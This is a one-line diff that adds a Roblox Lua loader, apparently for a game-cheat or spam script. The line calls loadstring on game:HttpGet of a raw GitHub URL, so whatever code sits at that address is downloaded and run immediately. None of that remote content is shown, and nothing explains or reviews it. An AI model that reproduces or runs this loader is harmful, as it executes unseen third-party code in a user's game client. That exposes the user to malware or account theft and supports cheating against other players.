@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Bravedersolve/loaders/main/loaders/wideopen-motorcycle-2xp-weekend-customiz-spam6-zm8spe3wm9bdvx.lua"))()
